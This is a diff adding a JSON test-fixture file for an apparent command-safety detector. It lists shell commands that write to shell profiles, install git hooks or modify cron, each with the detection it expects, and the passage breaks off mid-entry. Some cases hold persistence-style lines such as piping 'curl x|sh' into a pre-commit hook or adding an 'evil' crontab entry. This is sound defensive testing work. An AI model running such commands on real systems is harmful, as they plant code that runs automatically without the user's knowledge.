@@ -1,0 +1,1916 @@
+[
+ {
+  "name": "profile-echo-append-.bashrc",
+  "command": "echo 'x' >> ~/.bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.bashrc",
+  "command": "printf 'x\\n' > ~/.bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-echo-append-.bash_profile",
+  "command": "echo 'x' >> ~/.bash_profile",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.bash_profile",
+  "command": "printf 'x\\n' > ~/.bash_profile",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-echo-append-.bash_login",
+  "command": "echo 'x' >> ~/.bash_login",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.bash_login",
+  "command": "printf 'x\\n' > ~/.bash_login",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-echo-append-.profile",
+  "command": "echo 'x' >> ~/.profile",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.profile",
+  "command": "printf 'x\\n' > ~/.profile",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-echo-append-.zshrc",
+  "command": "echo 'x' >> ~/.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.zshrc",
+  "command": "printf 'x\\n' > ~/.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-echo-append-.zprofile",
+  "command": "echo 'x' >> ~/.zprofile",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.zprofile",
+  "command": "printf 'x\\n' > ~/.zprofile",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-echo-append-.zlogin",
+  "command": "echo 'x' >> ~/.zlogin",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.zlogin",
+  "command": "printf 'x\\n' > ~/.zlogin",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-echo-append-.zshenv",
+  "command": "echo 'x' >> ~/.zshenv",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.zshenv",
+  "command": "printf 'x\\n' > ~/.zshenv",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-echo-append-.kshrc",
+  "command": "echo 'x' >> ~/.kshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.kshrc",
+  "command": "printf 'x\\n' > ~/.kshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-echo-append-.config/fish/config.fish",
+  "command": "echo 'x' >> ~/.config/fish/config.fish",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-printf-trunc-.config/fish/config.fish",
+  "command": "printf 'x\\n' > ~/.config/fish/config.fish",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-no-tilde",
+  "command": "echo hi >> .bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-slash",
+  "command": "echo hi >> /.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-tee",
+  "command": "echo 'export A=1' | tee -a ~/.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-tee-noa",
+  "command": "cat foo | tee ~/.bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-pipe-only",
+  "command": "echo hi | ~/.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-upper",
+  "command": "ECHO hi >> ~/.BASHRC",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-cat",
+  "command": "cat payload >> ~/.profile",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-append-word",
+  "command": "append line >> ~/.bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-heredoc-word",
+  "command": "heredoc EOF >> ~/.bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-after-semicolon",
+  "command": "ls; echo x >> ~/.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-after-and",
+  "command": "true && echo x >> ~/.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-after-pipe",
+  "command": "ls | echo x >> ~/.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-too-far",
+  "command": "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa >> ~/.bashrc",
+  "expected": []
+ },
+ {
+  "name": "profile-300-ok",
+  "command": "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa >> ~/.bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-semicolon-between",
+  "command": "echo a; b >> ~/.bashrc",
+  "expected": []
+ },
+ {
+  "name": "profile-newline-between",
+  "command": "echo a\nb >> ~/.bashrc",
+  "expected": []
+ },
+ {
+  "name": "profile-read-only",
+  "command": "cat ~/.bashrc",
+  "expected": []
+ },
+ {
+  "name": "profile-prefix-word",
+  "command": "xecho a >> ~/.bashrc",
+  "expected": []
+ },
+ {
+  "name": "profile-echoed",
+  "command": "echoed a >> ~/.bashrc",
+  "expected": []
+ },
+ {
+  "name": "profile-redirect-space",
+  "command": "echo a >   ~/.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-double-redirect-space",
+  "command": "echo a > > ~/.zshrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-bashrc-suffix",
+  "command": "echo a >> ~/.bashrcx",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-leading-ws",
+  "command": "   echo a >> ~/.bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-dotted-start",
+  "command": "echo a >> ~/.zshenv && echo b >> ~/.zprofile",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-dotless-i",
+  "command": "pr\u0131ntf a >> ~/.bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-dotted-I",
+  "command": "pr\u0130ntf a >> ~/.bashrc",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   }
+  ]
+ },
+ {
+  "name": "profile-kelvin",
+  "command": "ec\u212a",
+  "expected": []
+ },
+ {
+  "name": "githook-cp-pre-commit",
+  "command": "cp evil.sh .git/hooks/pre-commit",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cp-post-commit",
+  "command": "cp evil.sh .git/hooks/post-commit",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cp-pre-push",
+  "command": "cp evil.sh .git/hooks/pre-push",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cp-post-merge",
+  "command": "cp evil.sh .git/hooks/post-merge",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cp-post-checkout",
+  "command": "cp evil.sh .git/hooks/post-checkout",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cp-pre-receive",
+  "command": "cp evil.sh .git/hooks/pre-receive",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cp-post-receive",
+  "command": "cp evil.sh .git/hooks/post-receive",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cp-update",
+  "command": "cp evil.sh .git/hooks/update",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cp-commit-msg",
+  "command": "cp evil.sh .git/hooks/commit-msg",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cp-prepare-commit-msg",
+  "command": "cp evil.sh .git/hooks/prepare-commit-msg",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-redirect",
+  "command": "echo 'curl x|sh' > .git/hooks/pre-commit",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-chmod-only",
+  "command": "chmod +x .git/hooks/pre-commit",
+  "expected": []
+ },
+ {
+  "name": "githook-cat-read",
+  "command": "cat .git/hooks/pre-commit",
+  "expected": []
+ },
+ {
+  "name": "githook-ls",
+  "command": "ls .git/hooks/pre-commit",
+  "expected": []
+ },
+ {
+  "name": "githook-sample",
+  "command": "cp x .git/hooks/pre-commit.sample",
+  "expected": []
+ },
+ {
+  "name": "githook-prefixed",
+  "command": "cp x foo.git/hooks/pre-commit",
+  "expected": []
+ },
+ {
+  "name": "githook-prefixed-slash",
+  "command": "cp x repo/.git/hooks/pre-commit",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-prefixed-dash",
+  "command": "cp x a-.git/hooks/pre-commit",
+  "expected": []
+ },
+ {
+  "name": "githook-upper",
+  "command": "CP x .GIT/HOOKS/PRE-COMMIT",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-mv",
+  "command": "mv hook .git/hooks/post-merge",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-install",
+  "command": "install -m755 hook .git/hooks/pre-push",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-tee",
+  "command": "echo x | tee .git/hooks/update",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-word-write",
+  "command": "write .git/hooks/commit-msg",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-catgt",
+  "command": "cat > .git/hooks/post-commit",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-unknown-hook",
+  "command": "cp x .git/hooks/applypatch-msg",
+  "expected": []
+ },
+ {
+  "name": "githook-followed-by-dot-underscore",
+  "command": "cp x .git/hooks/update_x",
+  "expected": []
+ },
+ {
+  "name": "githook-followed-by-dash",
+  "command": "cp x .git/hooks/update-x",
+  "expected": []
+ },
+ {
+  "name": "githook-followed-by-quote",
+  "command": "cp x '.git/hooks/pre-commit'",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "githook-cpr",
+  "command": "cpx a .git/hooks/pre-commit",
+  "expected": []
+ },
+ {
+  "name": "githook-installed",
+  "command": "installed .git/hooks/pre-commit",
+  "expected": []
+ },
+ {
+  "name": "githook-write-inside-word",
+  "command": "rewrite .git/hooks/pre-commit",
+  "expected": []
+ },
+ {
+  "name": "cron-e",
+  "command": "crontab -e",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-e-upper",
+  "command": "CRONTAB -E",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-l",
+  "command": "crontab -l",
+  "expected": []
+ },
+ {
+  "name": "cron-l-u",
+  "command": "crontab -u root -l",
+  "expected": []
+ },
+ {
+  "name": "cron-u-e",
+  "command": "crontab -u alice -e",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-dash",
+  "command": "echo '0 * * * * evil' | crontab -",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-dash-trailing-ws",
+  "command": "echo x | crontab -  ",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-dash-trailing-nl",
+  "command": "echo x | crontab -\n",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-dash-then-more",
+  "command": "echo x | crontab - && ls",
+  "expected": []
+ },
+ {
+  "name": "cron-file",
+  "command": "crontab mycron",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-file-path",
+  "command": "crontab /tmp/evil.cron",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-redirect",
+  "command": "crontab < /tmp/evil",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-redirect-nospace",
+  "command": "crontab</tmp/evil",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-r",
+  "command": "crontab -r",
+  "expected": []
+ },
+ {
+  "name": "cron-bare",
+  "command": "crontab",
+  "expected": []
+ },
+ {
+  "name": "cron-bare-nl",
+  "command": "crontab\n",
+  "expected": []
+ },
+ {
+  "name": "cron-var-spool",
+  "command": "echo '* * * * * x' > /var/spool/cron/root",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-etc-cron-d",
+  "command": "echo '* * * * * root x' >> /etc/cron.d/evil",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-etc-crontab",
+  "command": "printf 'x' | tee /etc/crontab",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-etc-cron-hourly",
+  "command": "cat job > /etc/cron.hourly/job",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-tee-pipe",
+  "command": "echo x | tee /var/spool/cron/user",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-after-semicolon",
+  "command": "ls; crontab -e",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-after-amp",
+  "command": "ls & crontab -e",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-prefix-word",
+  "command": "mycrontab -e",
+  "expected": []
+ },
+ {
+  "name": "cron-cat-etc",
+  "command": "cat /etc/crontab",
+  "expected": []
+ },
+ {
+  "name": "cron-u-file",
+  "command": "crontab -u bob file.txt",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-long-arg",
+  "command": "crontab aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-long-arg-102",
+  "command": "crontab aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-arg-semicolon",
+  "command": "crontab a;b",
